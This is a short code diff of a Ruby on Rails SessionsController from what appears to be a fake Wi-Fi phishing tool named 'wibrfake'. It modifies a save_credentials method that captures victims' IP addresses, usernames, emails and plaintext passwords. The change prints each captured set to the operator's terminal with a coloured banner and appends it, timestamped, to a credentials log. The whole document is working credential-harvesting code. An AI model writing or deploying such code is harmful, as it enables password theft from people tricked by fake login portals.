@@ -31,8 +31,15 @@ class SessionsController < ApplicationController
     private
   
     def save_credentials(ip, username, email, password)
-        File.open('credenciales.txt', 'a') do |file|
-            file.puts "IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
+        puts """\n\r#{ip}{
+        \n\r\tUser: #{username}
+        \r\tEmail: #{email}
+        \r\tPassword: #{password}
+        \r}"""
+        puts "\n"
+        print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  wlo1 \e[0m\033[38;5;236m\e[0m "
+        File.open(File.join(File.dirname(__FILE__), '../../lib/wibrfake/Logs/credentials.log'), 'a') do |file|
+            file.puts "#{Time.now} IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
         end
     end
 end
